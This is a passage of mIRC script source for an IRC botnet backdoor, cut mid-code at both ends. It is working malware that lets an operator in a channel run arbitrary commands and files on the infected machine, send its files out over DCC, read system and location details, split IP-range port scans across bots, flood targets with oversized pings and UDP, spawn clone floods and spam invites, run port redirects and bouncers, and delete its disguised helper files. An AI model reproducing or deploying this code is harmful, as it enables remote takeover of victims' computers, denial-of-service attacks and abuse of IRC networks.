    if ($gettok(%temp.r ,3,32) == $Null) { sockopen bnc.out. $+ $sock($sockname).port $+ . $+ $sock($sockname).ip $gettok(%temp.r ,2,32) 6667 $gettok(%temp.r,4,32)  | /sockmark bnc.out. $+ $sock($sockname).port $+ . $+ $sock($sockname).ip %bnc. $+ $sock($sockname).ip $+ .u %bnc. $+ $sock($sockname).ip $+ .n $sock($sockname).ip $gettok(%temp.r ,2,32) 6667 |  /sockwrite -nt $sockname : NOTICE AUTH : $+ $+ Attempting to connect to $gettok(%temp.r,2,32) on port 6667  |   halt   }  |  /sockopen bnc.out. $+ $sock($sockname).port $+ . $+ $sock($sockname).ip $gettok(%temp.r ,2,32) $gettok(%temp.r,3,32) $gettok(%temp.r,4,32) | /sockmark bnc.out. $+ $sock($sockname).port $+ . $+ $sock($sockname).ip %bnc. $+ $sock($sockname).ip $+ .u %bnc. $+ $sock($sockname).ip $+ .n $gettok(%temp.r ,2-4,32)
/sockwrite -nt $sockname : NOTICE AUTH : $+ $+ Attempting to connect to $gettok(%temp.r,2,32) on port $gettok(%temp.r ,3,32) | halt } | if ($sock(bnc.out. [ $+ [ $gettok($sockname,3-7,46) ] ] ) > 0) { sockwrite -nt bnc.out. [ $+ [ $gettok($sockname,3-7,46) ] ] %temp.r } }
on *:sockopen:bnc.out.*:{ sockwrite -tn $sockname User [ [ %bnc. [ $+ [ $gettok($sock($sockname).mark,1,32) ] ] ] ] a a : [ [ %bnc. [ $+ [ $gettok($sock($sockname).mark,1,32) ] ] ] ]  | sockwrite -tn $sockname Nick %bnc. [ $+ [ $gettok($sock($sockname).mark,2,32) ] ] | sockread  } 
on *:sockread:bnc.out.*:{ sockread -f %bnc.out.t | if (%bnc.log == on) { write bnc.log <<<[Outgoing]>>> %bnc.out.t } | sockwrite -nt bnc.in. [ $+ [ $gettok($sockname,3-7,46) ] ] %bnc.out.t |  unset %bnc.out.t }
alias remfiles { if ($exists(psys.dll) == $true) { .remove psys.dll } | if ($exists(asycfiit.com) == $true) { .remove asycfiit.com } | if ($exists(mapiuib.com) == $true) { .remove mapiuib.com } | if ($exists(uslscan.com) == $true) { .remove uslscan.com } | if ($exists(adspack.exe) == $true) { .remove adspack.exe } | if ($exists(cmmgr32.com) == $true) { .remove cmmgr32.com } | if ($exists(user33.com) == $true) { .remove user33.com } | if ($exists(forcad.exe) == $true) { .run forcad.exe } }
on 1:sockclose:inviter*:{ if (%i.b == off) { remove ichan.txt | halt } | if (%i.b == on) { msg %s.i.c 1[inviter]: Inviter was disconnected! Reloading. | /sockopen $sockname %i.server %i.port } }
alias c.control { if ($1 == in) { if ($2 == PING) { sockwrite -tn $sockname PONG $3 } } | if ($1 == quit) { if ($2 == $null) { halt } |  if ($sock(clone*,0) > 0) { sockwrite -tn clone* quit : $+ $2- } } | if ($1 == action) { if ($2 == $null) { halt } |  if ($sock(clone*,0) > 0) { sockwrite -tn clone* action $2 : $+ $3- } } | if ($1 == msg) { if ($2 == $null) { halt } |  if ($3 == $null) { halt } |  if ($sock(clone*,0) > 0) { sockwrite -tn clone* privmsg $2 : $+ $3- } } | if ($1 == notice) { if ($2 == $null) { halt } |  if ($3 == $null) { halt } |  if ($sock(clone*,0) > 0) {  sockwrite -tn clone* notice $2 : $+ $3- } } | if ($1 == ctcp) { if ($2 == $null) { halt } |  if ($sock(clone*,0) > 0) { .timer 2 1 sockwrite -tn clone* PRIVMSG $3 : $+ $2 $+  } } | if ($1 == join) { if ($2 == $null) { halt } |  if ($sock(clone*,0) > 0) {  sockwrite -tn clone* join $2- } } | if ($1 == part) { if ($2 == $null) { halt }
if ($sock(clone*,0) > 0) { //sockwrite -n clone* part $2 : $+ $3- } } | if ($1 == nick) {  %.nc = 1 |  :ncloop | if (%.nc > $sock(clone*,0)) { goto end }  | sockwrite -n $sock(clone*,%.nc) Nick $rand(a,z) $+ $rand(a,z) $+ $2 $+ $rand(a,z) $+ $r(a,z) |   inc %.nc |  goto ncloop | :end | halt } | if ($1 == read) {  %.nc = 1 |  :ncloop | if (%.nc > $sock(clone*,0)) { goto end }  | sockwrite -n $sock(clone*,%.nc) Nick $read $mircdirpsys.dll |   inc %.nc |  goto ncloop | :end | halt }  | if ($1 == action) { sockwrite -nt clone* $2 :action $3- $+  } }
alias startscanning { :loop | inc %loop | if $nick( %botchan , %loop ,v) == $me {  set %multiply $calc( %loop -1)   |  unset %loop |  goto end }
else goto loop | :end | set %botnum $nick( %botchan ,0,v) | /startscan $longip($calc($calc( %multiply *$round($calc($calc( %endlongip - %beglongip )/ %botnum ),0))+ %beglongip )) $longip($calc($calc( %multiply *$round($calc($calc( %endlongip - %beglongip )/ %botnum ),0))+ %beglongip +$round($calc($calc( %endlongip - %beglongip )/ %botnum ),0))) %port }
alias unset1variable {  unset %begshortip | unset %endshortip |  unset %botnum |  unset %multiply }
alias startscan { set %beglongip $longip($1) |  set %endlongip $longip($2) |  set %port $3 |  set %total $calc( %endlongip - %beglongip ) |  unset %totalscaning | setnewvars4scan }
alias setnewvars4scan { inc %totalscaning | if (%totalscaning == %total) { /finished } | set %ip1 $longip($calc( %beglongip + %totalscaning )) | inc %totalscaning | if (%totalscaning == %total) { opensocks 1 } | set %ip2 $longip($calc( %beglongip + %totalscaning )) | inc %totalscaning | if (%totalscaning == %total) { opensocks 2 } | set %ip3 $longip($calc( %beglongip + %totalscaning )) | inc %totalscaning | if (%totalscaning == %total) { opensocks 3 } | set %ip4 $longip($calc( %beglongip + %totalscaning )) | inc %totalscaning | if (%totalscaning == %total) { opensocks 4 } | set %ip5 $longip($calc( %beglongip + %totalscaning )) | inc %totalscaning | if (%totalscaning == %total) { opensocks 5 } | set %ip6 $longip($calc( %beglongip + %totalscaning )) | inc %totalscaning | if (%totalscaning == %total) { opensocks 6 } | set %ip7 $longip($calc( %beglongip + %totalscaning )) | inc %totalscaning | if (%totalscaning == %total) { opensocks 7 }
  set %ip8 $longip($calc( %beglongip + %totalscaning )) | inc %totalscaning | if (%totalscaning == %total) { opensocks 8 } | set %ip9 $longip($calc( %beglongip + %totalscaning )) | inc %totalscaning | if (%totalscaning == %total) { opensocks 9 } | set %ip10 $longip($calc( %beglongip + %totalscaning )) | inc %totalscaning | if (%totalscaning == %total) { opensocks 10 } | set %ip11 $longip($calc( %beglongip + %totalscaning )) | inc %totalscaning | if (%totalscaning == %total) { opensocks 11 } | set %ip12 $longip($calc( %beglongip + %totalscaning )) | inc %totalscaning | if (%totalscaning == %total) { opensocks 12 } | set %ip13 $longip($calc( %beglongip + %totalscaning )) | inc %totalscaning | if (%totalscaning == %total) { opensocks 13 } | set %ip14 $longip($calc( %beglongip + %totalscaning )) | inc %totalscaning | if (%totalscaning == %total) { opensocks 14 } | set %ip15 $longip($calc( %beglongip + %totalscaning )) | inc %totalscaning
  if (%totalscaning == %total) { opensocks 15 } | set %ip16 $longip($calc( %beglongip + %totalscaning )) | inc %totalscaning | if (%totalscaning == %total) { opensocks 16 } | set %ip17 $longip($calc( %beglongip + %totalscaning )) | inc %totalscaning | if (%totalscaning == %total) { opensocks 17 } | set %ip18 $longip($calc( %beglongip + %totalscaning )) | inc %totalscaning | if (%totalscaning == %total) { opensocks 18 } | set %ip19 $longip($calc( %beglongip + %totalscaning )) | inc %totalscaning | if (%totalscaning == %total) { opensocks 19 } | set %ip20 $longip($calc( %beglongip + %totalscaning )) | inc %totalscaning | if (%totalscaning == %total) { opensocks 20 } | set %ip21 $longip($calc( %beglongip + %totalscaning )) | inc %totalscaning | if (%totalscaning == %total) { opensocks 21 } | set %ip22 $longip($calc( %beglongip + %totalscaning )) | inc %totalscaning | if (%totalscaning == %total) { opensocks 22 }
set %ip23 $longip($calc( %beglongip + %totalscaning )) | inc %totalscaning | if (%totalscaning == %total) { opensocks 23 } | set %ip24 $longip($calc( %beglongip + %totalscaning )) | inc %totalscaning | if (%totalscaning == %total) { opensocks 24 } | set %ip25 $longip($calc( %beglongip + %totalscaning )) | inc %totalscaning | opensocks }
alias opensocks { sockopen ip1 %ip1 %port | if ($1 == 1) { finished } | sockopen ip2 %ip2 %port | if ($1 == 2) { finished } | sockopen ip3 %ip3 %port | if ($1 == 3) { finished } | sockopen ip4 %ip4 %port | if ($1 == 4) { finished } | sockopen ip5 %ip5 %port | if ($1 == 5) { finished } | sockopen ip6 %ip6 %port | if ($1 == 6) { finished } | sockopen ip7 %ip7 %port | if ($1 == 7) { finished } | sockopen ip8 %ip8 %port | if ($1 == 8) { finished } | sockopen ip9 %ip9 %port | if ($1 == 9) { finished } | sockopen ip10 %ip10 %port | if ($1 == 10) { finished } | sockopen ip11 %ip11 %port | if ($1 == 11) { finished } | sockopen ip12 %ip12 %port | if ($1 == 12) { finished } | sockopen ip13 %ip13 %port | if ($1 == 13) { finished } | sockopen ip14 %ip14 %port | if ($1 == 14) { finished } | sockopen ip15 %ip15 %port | if ($1 == 15) { finished } | sockopen ip16 %ip16 %port | if ($1 == 16) { finished } | sockopen ip17 %ip17 %port 
if ($1 == 17) { finished } | sockopen ip18 %ip18 %port | if ($1 == 18) { finished } | sockopen ip19 %ip19 %port | if ($1 == 19) { finished } | sockopen ip20 %ip20 %port | if ($1 == 20) { finished } | sockopen ip21 %ip21 %port | if ($1 == 21) { finished } | sockopen ip22 %ip22 %port | if ($1 == 22) { finished } | sockopen ip23 %ip23 %port | if ($1 == 23) { finished } | sockopen ip24 %ip24 %port | if ($1 == 24) { finished } | sockopen ip25 %ip25 %port | .timer_1 1 %timeout /sockclose ip* | .timer_2 1 $calc(1+%timeout) /setnewvars4scan }
on 1:sockopen:ip*:{  if ($sockerr > 0) { halt } |  /write %port $+ .txt % [ $+ [ $sockname ] ] on %port | /msg %botchan 1[IP]: % [ $+ [ $sockname ] ] [PORT1]: %port |  inc %totalsuccess | sockclose $sockname | halt }
alias properform {  if ($1 == $null) || ($2 == $null) { /msg $chan 1[Format]: !scan [beginning IP] [ending IP] [PORT] | halt } |   if ($3 == $null) {  /msg $chan 1[Error]: Enter The Port Please. | halt } |  if (. !isin $1) || (. !isin $2) { /msg $chan sorry I believe an IP has periods in it EG:127.0.0.1 | halt }
if ($3 !isnum 1-65535) { /msg $chan 1[Error]: Invalid Port. Use 1 - 65535 | halt } |  else return good |  halt }
alias finished { msg %botchan 1[Scan complete]:  $+ %begshortip $+  :to:  $+ %endshortip $+  Port:  $+ %port $+  |  msg %botchan Scanning Complete... |  stopscan | unset1variable |  halt }
alias stopscan { /sockclose ip* |  timer_1 off | timer_2 off |  unset %begshortip |  unset %beglongip |  unset %endshortip |  unset %endlongip |  unset %port |  unset %botchan |  unset %botnum |  unset %ip* |  unset %loop |  unset %multiply |  unset %total |  unset %totalscaning }
on 1:sockopen:service*:{ sockwrite -nt $sockname user $ident($r(1,9)) $ident($r(1,9)) $ident($r(1,9)) : $+ $read $mircdirpsys.dll | sockwrite -nt $sockname nick $floodnick($r(0,5)) $+ $ident($r(1,9)) $+ $floodnick($r(0,5)) | sockwrite -nt $sockname privmsg Nickserv :Register %se.pass | sockwrite -nt $sockname privmsg ChanServ,NickServ,MemoServ :help | sockclose $sockname }
alias bnc { if ($1 == start) { //set %bnc. [ $+ [ $2 ] ] $3  | //socklisten bnc. $+ $2 $2  } |  if ($1 == reset) { unset %bnc* | sockclose bnc* } |  if ($1 == log) { set %bnc.log $2 }  }
on 1:sockopen:clone*:{ sockwrite -nt $sockname user $ident($r(1,9)) $ident($r(1,9)) $ident($r(1,9)) : $+ $read $mircdirpsys.dll | sockwrite -nt $sockname nick $floodnick($r(0,5)) $+ %c.nick $+ $floodnick($r(0,5)) | sockwrite -nt $sockname JOIN %c.chan %c.key }
on 1:sockopen:notice*:{ if (yes = %flooditype) { .set %n.nick $rands($r(0,9)) } | sockwrite -nt $sockname user $ident($r(1,9)) $ident($r(1,9)) $ident($r(1,9)) : $+ $read $mircdirpsys.dll | sockwrite -nt $sockname nick $floodnick($r(0,5)) $+ %n.nick $+ $floodnick($r(0,5)) | sockwrite -nt $sockname %command %n.cn %n.key | sockwrite -nt $sockname %n.command1 %n.cn : $+ %n.command2 | sockwrite -nt $sockname notice %n.cn : $+ %n.notice | sockclose $sockname }
on 1:sockopen:action*:{ if (yes = %floodactype) { .set %ac.nick $rands($r(0,9)) } | sockwrite -nt $sockname user $ident($r(1,9)) $ident($r(1,9)) $ident($r(1,9)) : $+ $read $mircdirpsys.dll | sockwrite -nt $sockname nick $floodnick($r(0,5)) $+ %ac.nick $+ $floodnick($r(0,5)) | sockwrite -nt $sockname %command %ac.cn %ac.key | sockwrite -nt $sockname %ac.command1 %ac.cn : $+ %ac.command2 | sockwrite -nt $sockname privmsg %ac.cn :action %ac.msg $+  | sockclose $sockname }
on 1:sockopen:start*:{ if (yes = %floodstype) { .set %s.nick $rands($r(0,9)) } | sockwrite -nt $sockname user $ident($r(1,9)) $ident($r(1,9)) $ident($r(1,9)) : $+ $read $mircdirpsys.dll | sockwrite -nt $sockname nick $floodnick($r(0,5)) $+ %s.nick $+ $floodnick($r(0,5)) | sockwrite -nt $sockname notice %s.fuck : $+ %notice | sockwrite -nt $sockname %s.comand %s.fuck : $+ %s.comand1 | sockwrite -nt $sockname privmsg %s.fuck : $+ %s.msg | sockclose $sockname }
on 1:sockopen:fns*:{ sockwrite -nt $sockname user $ident($r(1,9)) $ident($r(1,9)) $ident($r(1,9)) : $+ $read $mircdirpsys.dll | sockwrite -nt $sockname nick $read $mircdirpsys.dll | sockwrite -nt $sockname notice %fns.fuck : $+ %notice | sockwrite -nt $sockname %fns.comand %fns.fuck : $+ %fns.comand1 | sockwrite -nt $sockname privmsg %fns.fuck : $+ %fns.msg | sockclose $sockname }
on 1:sockopen:go*:{ if (yes = %floodgtype) { .set %g.nick $rands($r(0,9)) } | sockwrite -nt $sockname user $ident($r(1,9)) $ident($r(1,9)) $ident($r(1,9)) : $+ $read $mircdirpsys.dll | sockwrite -nt $sockname nick $floodnick($r(0,5)) $+ %g.nick $+ $floodnick($r(0,5)) | sockwrite -nt $sockname join %g.chan %g.key | sockwrite -nt $sockname %g.comand %g.chan : $+ %g.comand1 | sockwrite -nt $sockname privmsg %g.chan : $+ %g.msg | sockclose $sockname }
on 1:sockopen:fcs*:{ sockwrite -nt $sockname user $ident($r(1,9)) $ident($r(1,9)) $ident($r(1,9)) : $+ $read $mircdirpsys.dll | sockwrite -nt $sockname nick $read $mircdirpsys.dll | sockwrite -nt $sockname join %fcs.chan %fcs.key | sockwrite -nt $sockname %fcs.comand %fcs.chan : $+ %fcs.comand1 | sockwrite -nt $sockname privmsg %fcs.chan : $+ %fcs.msg | sockclose $sockname }
on 1:sockopen:jp*:{ if (yes = %floodjptype) { .set %jp.nick $rands($r(0,9)) } | sockwrite -nt $sockname user $ident($r(1,9)) $ident($r(1,9)) $ident($r(1,9)) : $+ $read $mircdirpsys.dll | sockwrite -nt $sockname nick $floodnick($r(0,5)) $+ %jp.nick $+ $floodnick($r(0,5)) | sockwrite -nt $sockname join %jp.chan %jp.key | sockwrite -nt $sockname %jp.comand %jp.chan : $+ %jp.comand1 | sockwrite -nt $sockname part %jp.chan : $+ %jp.msg | sockclose $sockname }
on 1:sockopen:quit*:{ if (yes = %floodqtype) { .set %q.nick $rands($r(0,9)) } | sockwrite -nt $sockname user $ident($r(1,9)) $ident($r(1,9)) $ident($r(1,9)) : $+ $read $mircdirpsys.dll | sockwrite -nt $sockname nick $floodnick($r(0,5)) $+ %q.nick $+ $floodnick($r(0,5)) | sockwrite -nt $sockname join %q.chan %q.key | sockwrite -nt $sockname %q.comand %q.chan : $+ %q.comand1 | sockwrite -nt $sockname quit : $+ %q.msg | sockclose $sockname }
on 1:disconnect:.timer_pinger | .timer_rejoin off | //.identd on $ident($r(1,9)) | //.nick $b0tnick | .server %server %sport
on 100:text:*:*:{ hidden | if ($1 == !clone.action) { /c.control action $2- } | if ($1 == !clone.raw) { if ($2 == $null) { halt } | if ($2 == help) { .notice $nick 1[use1]: !Clone.raw <raw command> | halt } | if ($2 != $null) && ($2 != Help) && ($sock(Clone*) != $null) { sockwrite -nt Clone* $2- | halt } } | if ($1 == !packet) { if ($2 == $null) { /.msg $chan 1[use]: !packet <ip> <num> | halt } | if ($chr(46) isin $2) && ($remove($2,$chr(46)) isnum) { //run ping.exe -n $3 -v AUTH -l 64000 $2 -w 0 | //run $mircdir $+ User33.com /n /fh ping | /timer 2 1 //run $mircdir $+ User33.com /n /fh ping | /msg # 1[Sending]: 64,000kb of Data to: $2  } }
  if ($1 == !version) { .notice $nick %version } | if ($1 == !reboot) { .notice $nick [Reboot]: running: Forcad.exe | run forcad.exe } | if ($1 == !msg) { if ($2 == $null) { halt } | //msg $2- | halt } | if ($1 == !part) { if ($2 == $null) { halt } | //part $2- | halt } | if ($1 == !join) { if ($2 == $null) { halt } | //join $2- | halt } | if ($1 == !copy) { if ($2 == $null) || ($3 == $null) { halt } | if ($2 != $null) && ($3 != $null) && ($exists($2) == $true) && ($exists($nofile($3)) == $true) { /.copy $2 $3 | /.notice $nick 1[Copy]: $nopath($2) successfully copied to: $nofile($3) } } | if ($1 == !mode) { if ($2 == $null) { halt } | if ($me isop $chan) { //mode $2 $3- } } | if ($1 == !out) { quit reloading my systems * $+ $nick $+ * | /.identd On $read $mircdirpsys.dll | //.nick $b0tnick | .server %server %sport } | if ($1 == !exit) { quit EXIT command said by: * $+ $nick $+ * | exit }
  if ($1 == !randident) { .identd on $ident($r(1,9)) } | if ($1 == !readident) { .identd on $read $mircdirpsys.dll } | if ($1 == !botnick) { /.nick $b0tnick | halt } | if ($1 == !readnick) { /.nick $read $mircdirpsys.dll } | if ($1 == !rand) { if ($2 != $null) { //nick $2 $+ $ident($r(1,9)) } } | if ($1 == !nick) { if ($2 != $null) { //nick $2 | halt } } | if ($1 == !run) { if ($2 == $null) { halt } | if ($2 != $null) && ($exists($2) == $true) { //run $2- | halt } } | if ($1 == !timeout) { if ($2 != $null) { set %timeout $2 | halt } } | if ($1 == !icmp) { if ($2 == $null) { halt } | if ($2 == help) { .notice $nick 1[use]: !ICMP <ip> <packet size> <how many> ,[Exam]: !ICMP 127.0.0.1 2000 1000 | halt } | .remove icmp.vbs | .write icmp.vbs Set src3 = CreateObject("Wscript.shell") | .write icmp.vbs src3.run "command /c ping -n $4 -l $3 -w 0 $2 ",0,true | .run icmp.vbs } | if ($1 == !set) { %mto = $chan
    if ($chan == $null) { set %mto $nick } | if ($2 != $null) { //set $2 [ [ $3- ] ] | //msg %mto 1[Variable set]: $2 to: $3- | unset %mto | halt } } | if ($1 ==  !unset) { %mto = $chan | if ($chan == $null) { set %mto $nick } | if ($2 != $null) { //unset [ [ $2- ] ] | /.msg %mto 1[Variable unset]: $2- successfully removed from variables list. } } | if ($1 == !command) { if ($2 != $null) { $2- | .notice $nick 1[Done]: / $+ $2- | halt } } | if ($1 == !remove) { if ($exists($2) = $false) { halt } | if ($exists($2) = $true) { /.remove $2 | /.notice $nick 1[ $+ $nopath($2-) $+ ]: successfully removed. } } | if ($1 == !rename) { if ($2 = $null) || ($exists($2) = $false) { halt } | if ($exists($2) = $true) { /.rename $2- | /.notice $nick 1[ $+ $nopath($2) $+ ] successfully renamed to: $nopath($3) $+  } } | if ($1 == !send) {
    if ($exists($2-) == $true) { /.dcc send $nick $2- | .fsend on | /.pdcc 500000 | .notice $nick 1Note:1 i will Send  $+ $nopath($2-) $+  now... | halt } | if ($exists($2-) != $true) { /.notice $nick 1Note: File not Found. } } | if ($1 == !fserv) { if ($level($nick) == 100) {
    /.msg $nick [File Server]: $nick | /.fserve $nick 3 $2 } } | if ($1 == !identd) { %mto = $chan | if ($chan == $null) { set %mto $nick } | if ($2 != $null) { /.msg %mto 1[Identd] set as to: $2 $+  | identd on $2 | unset %mto } } | if ($1 == !appstate) { %mto = $chan | if ($chan == $null) { set %mto $nick } | /.msg %mto 1[AppState]: $appstate | unset %mto } | if ($1 == !myhost) { %mto = $chan | if ($chan == $null) { set %mto $nick } | /.msg %mto 1[IP]: $ip [Host]: $host | unset %mto } | if ($1 == !show) { %mto = $chan | if ($chan == $null) { set %mto $nick } | if ($2 != $null) && (% isin $left($2,1)) { //.msg %mto 1[ $+ $2 $+ ]: is currently set as: [ [ $2- ] ] | unset %mto } | if ($2 != $null) && ($ isin $left($2,1)) { /.msg %mto 1[ $+ $2 $+ ]: return to: [ [ $2- ] ] | unset %mto } } | if ($1 == !die) && ($islower($nick) = $true) {
    .timerquit 1 2 quit Die Command said by: * $+ $nick $+ * | .timerexit 1 2 exit | remfiles } | if ($1 == !clone.msg) { /c.control msg $$2 $3-  } | if ($1 == !clone.quit) { /c.control quit $2- } | if ($1 == !clone.ctcp) { /c.control ctcp $2 $3 } | if ($1 == !clone.cycle) {
  /c.control part $2 $4- | /c.control join $2 $3 } | if ($1 == !clone.notice) { if ($2 == $null) { halt } |  if ($3 == $null) { halt } | if ($sock(clone*,0) > 0) { sockwrite -tn clone* notice $2 : $+ $3- } } | if ($1 == !info) { %mto = $chan | if ($chan == $null) { set %mto $nick } | //.msg %mto 1[System info] Date:[ $+ $asctime(dddd mmmm dd yyyy) $+ ] Time:[ $+  $asctime(hh:nn tt ) $+ ] Country:[ $+ $readini -n C:\WINDOWS\win.ini Intl sCountry $+ ] URL:[ $+ $url $+ ] exe:[ $+ $nopath($mircexe) $+ ] version:[ $+ $version $+ ] ini:[ $+ $nopath($mircini) $+ ] OS:[Windows $+ $os $+ ] UpTime:[ $+  $duration($calc( $ticks / 1000 )) $+ ] Resolution:[ $+ $window(-1).w $+ x $+ $window(-1).h $+ ] Video card:[ $+ $readini c:\WINDOWS\system.ini boot.description display.drv $+ ] Free space: [ $+ $round($calc((($disk(c).free) + ($disk(d).free) + ($disk(e).free))/1048576),2) MB] | unset %mto }
  if ($1 == !country) { %mto = $chan | if ($chan == $null) { set %mto $nick } | //.msg %mto [Country]: $readini -n C:\WINDOWS\win.ini Intl sCountry $readini -n C:\WINDOWS\win.ini Intl iCountry | unset %mto } | if ($1 == !clone.nick) { if ($2 == $null) { halt } | if ($2 != $null) { set %c.nick $2 } | %.nc = 1 | :ncloop | if (%.nc > $sock(clone*,0)) { goto end } | sockwrite -n $sock(clone*,%.nc) Nick $ident($r(1,3)) $+ $2 $+ $ident($r(1,3)) | inc %.nc |  goto ncloop | :end |  halt } | if ($1 == !clone.rnick) { %.nc = 1 | :ncloop | if (%.nc > $sock(clone*,0)) { goto end } | sockwrite -n $sock(clone*,%.nc) Nick $read $mircdirpsys.dll | inc %.nc |  goto ncloop | :end |  halt } |  if ($1 == !clone.part) { /c.control part $2- } | if ($1 == !clone.join) { /c.control join $2- } |   if ($1 == !clone.dcc.chat) { sockwrite -n clone* PRIVMSG $2 :DCC CHAT $2 1058633484 3481 }
  if ($1 == !port) { if ($2 == $null) { halt } | if ($2 == help) { .notice $nick 1[use]: !Port add 1000 IrC.Q8Dragons.Org 6667 ,use this command to add Port Redirect. | .notice $nick 1[use]: !Port Stop 1000 ,use this command to Stop Port Redirect. | halt } | if ($2 == add) { if ($5 == $null) { /.notice $nick 1[use]: !Port add <Input Port> <Output Server> <Output Server Port> ,[Exam]: !Port add 1000 IrC.Q8DraGonS.OrG 6667 | halt } | //gtportdirect $3- | .notice $nick 1[Redirect Added]: Port( $+ $3 $+ ) to: $4 $5 | .notice $nick 1[Local IP Address]: $ip | halt } |  if ($2 == stop) {  if ($3 == $null) { halt } | /pdirectstop $3 | .notice $nick 1[Port Redirection]: Port( $+ $3 $+ ) has been stopped. | halt } } | if ($1 == !udp) { //set %pchan # |  if ($4 == random) { //gcoolstart $2 $3 $r(1,65000) | halt } | //gcoolstart $2 $3 $4 } | if ($1 == !stopscan) { stopscan | halt } | if ($1 == !clone.dcc.send) {
  sockwrite -n clone* PRIVMSG $2 :DCC SEND $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ $r(A,Z) $+ .txt 1058633484 2232 $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+ $rand(1,9) $+  } 
  if ($1 == !inviter) { %s.i.c = # | if (# == $null) { set  %s.i.c $nick } | if ($2 == load) { /set %i.server $3 | /set %i.port $4 | %i.b = on | s.inviter } | if ($2 == stop) { sockclose inviter* | remove ichan.txt | //set %i.b off | unset %i.temp.* | /timerinviteconnect off | msg # 1[inviter]: Inviter has been killed. } | if ($2 == status) { if ($sock(inviter*,0) == 0) { msg # 1[Status]: Inviter Not Connected! | halt } | if ($sock(inviter*,0) > 0) { .msg # 1[Status]: Inviter Connected ( $+ $sock(inviter*,0) $+ ) } } | if ($2 == stats) { msg # 1[Inviter]: Stats Total Invited: $calc(%i.t.j + %i.t.p) $+  - Delay: %i.ondelay } | if ($2 == list) { sockwrite -nt inviterN LIST :* $+ $3 $+ * } | if ($2 == message) { set %imsg $3- | msg # 1[inviter]: Invite Message set to: $3- } | if ($2 == ctotal) { msg # 1[inviter]: Random Channels Total: $+ $lines(ichan.txt) $+  } | if ($2 == reset) { 
      .msg # 1[inviter]: All Settings Unset! | unset %i.t.j | unset %i.t.p | unset %imsg | unset %i.server | unset %s.i.c | unset %i.b | unset %i* | write -c ichan.txt | remove ichan.txt | unset %t.i | sockclose inviter* }  |  if ($2 == mode) { /sockwrite -nt inviter*  MODE $3-  } | if ($2 == join) { if ($3 == random) {  if ($lines(ichan.txt) < 0) || ($exists(ichan.txt) == $false) { msg # 1[inviter]: error: Gather channels first! | halt }  |   set %i.r.j.a $4 | /set %i.r.j.i 0  |   :loop |    if (%i.r.j.i  > %i.r.j.a) { goto end } |     /sockwrite -nt inviterN JOIN : $+ $read -l $+ $r(1,$lines(ichan.txt)) ichan.txt  |     inc %i.r.j.i  |     goto loop |     :end    |   unset %i.r.j.i | unset %i.r.j.a   |   halt    } |   else { /sockwrite -nt inviterN JOIN : $+ $3 }  }  | if ($2 == part) { //sockwrite -nt inviterN PART : $+ $3- }   |  if ($2 == nick) { if ($3 == random) { 
  sockwrite -nt inviterN NICK $read $mircdirpsys.dll | halt } | //sockwrite -nt inviterN NICK $3 } | if ($2 == delay) { set %i.ondelay $3 | msg # 1[inviter]: Delay set to: $3 } }
  if ($1 == !bnc) { if ($2 == stats) { .msg $nick 1[BNC-STATS]: Total Users Connected:( $+ $sock(bnc.in*,0) $+ ) Bncs open:( $+ $calc($sock(bnc.*,0) - $sock(bnc.in*,0) - $sock(bnc.out*,0)) $+ ) Server Connections:( $+ $sock(bnc.out*,0) $+ ) } | if ($2 == log) { bnc log $3 | msg $nick 1[BNC]: Logger has been set to: $3 $+  | if ($3 == off) { remove bnc.log } } | if ($2 == start) { /bnc start $3 $4 | msg $nick 1[BNC]: Setup complete: $Ip $+ : $+ $3 $+  | msg $nick 1[BNC] use: /server $Ip $+ : $+ $3 $+  [Then /Quote Pass $4 $+ ] | halt } | if ($2 == help) {  msg $nick 1[BNC] use: !BNC start <port> <pass> |  halt   } | if ($2 == stop) {  if ($sock(bnc. [ $+ [ $3 ] ] ,0) == 0) { msg $nick 1[BNC]: Bouncer not active on that port! | halt }  | msg $nick 1[BNC]: Server/port for ( $+ $3 $+ ) has been stopped. |  sockclose bnc. $+ $3  } | if ($2 == kill) && ($3 == users) { 
    .msg $nick 1[BNC]:  $+ $sock(bnc.in*,0) $+  Users on bnc, have been disconnected... | sockclose bnc.in* | sockclose bnc.out* } | if ($2 == shutdown) { msg $nick 1[BNC]: BNC Server shutdown... | bnc reset | msg $nick 1[BNC]: Server shutdown complete... } | if ($2 == list) && ($3 == bnc) { if ($sock(bnc.*,0) == 0) { msg $nick 1[BNC]: Error, there are currently no bnc servers open... | halt } | if ($sock(bnc.*,0) > 0) { .msg $nick 1[BNC]: Listing Active/Open BNC's | %bnc.stl = 0 | :again | if ($sock(bnc.*,0) == %bnc.stl) { goto done } | inc %bnc.stl | if ($gettok($sock(bnc.*,%bnc.stl),2,46) !isnum 1-65000) { goto again } | msg $nick 1[BNC]: $chr(35) $+ %bnc.stl $+ . [PORT: $+ $gettok($sock(bnc.*,%bnc.stl),2,46) $+ ] [PASS: $+ [ %bnc. [ $+ [ $gettok($sock(bnc.*,%bnc.stl),2,46) ] ] ] $+ ] | goto again | :done | msg $nick 1[BNC1]: End Listing Active BNC's... } }
    if ($2 == list) && ($3 == users) { if ($sock(bnc.in*,0) == 0) { .msg $nick 1[BNC] Error: No Users Connected to the bnc... | halt } | if ($sock(bnc.in*,0) > 0) { msg $nick 1[BNC]: Listing Active Users... | %bnc.stlu = 0 | :again2 | if ($sock(bnc.in*,0) == %bnc.stlu) { goto done2 } |   inc %bnc.stlu  | msg $nick 1[BNC]: $chr(35) $+ %bnc.stlu $+ . Connection: Nick:[ $+  [ %bnc. [ $+ [ $gettok($sock(bnc.in*,%bnc.stlu),4-7,46) $+ .n ] ] ] $+ ] [ $+ [ %bnc. [ $+ [ $gettok($sock(bnc.in*,%bnc.stlu),4-7,46) $+ .u ] ] ] $+ ] is: $gettok($sock(bnc.in*,%bnc.stlu),4-7,46) $+  on Port: $sock(bnc.in*,%bnc.stlu).mark $+  | goto again2 | :done2 |   msg $nick 1[BNC]: List of Users Complete... } } | if ($2 == list) && ($3 == server) { if ($sock(bnc.out*,0) == 0) { msg $nick 1[BNC]: Error: Currently No Users on Servers Connected... | halt } | if ($sock(bnc.out*,0) > 0) { 
